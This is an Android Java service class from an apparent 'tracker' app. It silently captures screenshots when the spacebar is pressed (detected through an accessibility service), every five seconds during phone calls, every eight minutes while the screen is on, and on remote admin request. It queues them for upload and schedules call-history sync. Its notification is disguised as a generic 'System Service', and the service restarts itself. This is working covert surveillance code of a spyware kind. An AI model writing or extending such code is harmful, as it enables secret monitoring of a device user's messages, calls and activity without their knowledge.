package com.tracker.app.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;
import com.tracker.app.jobs.CallHistorySyncJobService;
import com.tracker.app.jobs.HeartbeatJobService;
import com.tracker.app.jobs.UploadJobService;

/**
 * Foreground service required by Android to keep background services alive.
 * Shows a minimal persistent notification (required by Android OS).
 *
 * This service coordinates:
 * - SpacebarAccessibilityService (spacebar -> screenshot)
 * - CallMonitorService (call detection -> 5sec screenshots)
 */
public class MonitoringForegroundService extends Service {

    private static final String TAG = "MonitorForeground";
    private static final String CHANNEL_ID = "monitoring_channel";
    private static final int NOTIFICATION_ID = 1001;
    public static MonitoringForegroundService instance;
    private Timer periodicTimer;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        createNotificationChannel();

        // Start as foreground service
        Notification notification = createNotification();
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }

        // Wire up spacebar detection
        setupSpacebarListener();

        // Wire up call monitoring
        setupCallListener();

        // Start periodic screenshots (every 8 minutes)
        startPeriodicScreenshots();

        Log.d(TAG, "Monitoring foreground service started");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    /**
     * When spacebar is detected by AccessibilityService,
     * capture a screenshot and queue it for upload.
     */
    private void setupSpacebarListener() {
        SpacebarAccessibilityService.onSpacebarPressed = () -> {
            Log.d(TAG, "Spacebar trigger received");
            if (SpacebarAccessibilityService.instance != null) {
                SpacebarAccessibilityService.instance.takeSilentScreenshot(file -> {
                    if (file != null) {
                        Log.d(TAG, "Spacebar screenshot captured: " + file.getAbsolutePath());
                        UploadQueue.addSpacebarScreenshot(file);
                        UploadJobService.triggerNow(getApplicationContext());
                    }
                });
            }
        };
    }

    /**
     * When a call starts, begin 5-second interval screenshots.
     * When the call ends, stop and queue for batch upload.
     */
    private void setupCallListener() {
        CallMonitorService.onCallStarted = (source) -> {
            Log.d(TAG, "Call started from: " + source + " - beginning screenshot capture");
            if (SpacebarAccessibilityService.instance != null) {
                SpacebarAccessibilityService.instance.startCallScreenshots(source);
            }
        };

        CallMonitorService.onCallEnded = (source) -> {
            Log.d(TAG, "Call ended from: " + source + " - stopping capture and queuing upload");
            if (SpacebarAccessibilityService.instance != null) {
                SpacebarAccessibilityService.CallScreenshotResult result = SpacebarAccessibilityService.instance.stopCallScreenshots();
                if (!result.files.isEmpty()) {
                    UploadQueue.addCallScreenshots(result, source);
                    UploadJobService.triggerNow(getApplicationContext());
                }
            }
        };
    }

    /**
     * Capture a screenshot for admin realtime pull.
     * Uses a CountDownLatch to block and return the file synchronously for FCM.
     */
    public File captureForRealtimePull() {
        if (SpacebarAccessibilityService.instance == null) {
            Log.e(TAG, "Cannot capture realtime pull: SpacebarAccessibilityService is null");
            return null;
        }

        AtomicReference<File> capturedFile = new AtomicReference<>(null);
        CountDownLatch latch = new CountDownLatch(1);

        SpacebarAccessibilityService.instance.takeSilentScreenshot(file -> {
            capturedFile.set(file);
            latch.countDown();
        });

        try {
            // Wait up to 5 seconds for the screenshot
            latch.await(5, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Log.e(TAG, "Realtime pull screenshot interrupted");
        }

        return capturedFile.get();
    }

    private void createNotificationChannel() {
        NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
        );
        channel.setDescription("Background monitoring service");
        channel.setShowBadge(false);
        NotificationManager manager = getSystemService(NotificationManager.class);
        manager.createNotificationChannel(channel);
    }

    private Notification createNotification() {
        return new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setOngoing(true)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void startPeriodicScreenshots() {
        periodicTimer = new Timer();
        // 8 minutes = 8 * 60 * 1000 = 480,000 milliseconds
        periodicTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                try {
                    android.os.PowerManager pm = (android.os.PowerManager) getSystemService(android.content.Context.POWER_SERVICE);
                    if (pm != null && pm.isInteractive()) {
                        Log.d(TAG, "Periodic check: Screen is ON - capturing screenshot");
                        capturePeriodicScreenshot();
                    } else {
                        Log.d(TAG, "Periodic check: Screen is OFF - skipping");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error in periodic screenshot timer", e);
                }
            }
        }, 480000, 480000);
    }

    private void capturePeriodicScreenshot() {
        if (SpacebarAccessibilityService.instance == null) {
            Log.e(TAG, "Cannot capture periodic screenshot: SpacebarAccessibilityService is null");
            return;
        }
        SpacebarAccessibilityService.instance.takeSilentScreenshot(file -> {
            if (file != null) {
                Log.d(TAG, "Periodic screenshot captured: " + file.getAbsolutePath());
                UploadQueue.addPeriodicScreenshot(file);
                UploadJobService.triggerNow(getApplicationContext());
            }
        });
    }

    public static void startServicesIfNeeded(Context context) {
        String token = context.getSharedPreferences("tracker_prefs", Context.MODE_PRIVATE)
                .getString("api_token", null);
        if (token == null || token.isEmpty()) return;

        if (instance == null) {
            Log.d(TAG, "Foreground service is not running. Self-healing/Starting...");
            try {
                Intent intent = new Intent(context, MonitoringForegroundService.class);
                context.startForegroundService(intent);
            } catch (Exception e) {
                Log.e(TAG, "Failed to start foreground service in self-heal", e);
            }
        }
        
        // Ensure jobs are scheduled
        try {
            CallHistorySyncJobService.schedule(context);
            HeartbeatJobService.schedule(context);
            UploadJobService.schedule(context);
        } catch (Exception e) {
            Log.e(TAG, "Failed to reschedule jobs in self-heal", e);
        }
    }

    @Override
    public void onDestroy() {
        if (periodicTimer != null) {
            periodicTimer.cancel();
            periodicTimer = null;
        }
        instance = null;
        super.onDestroy();
    }
}
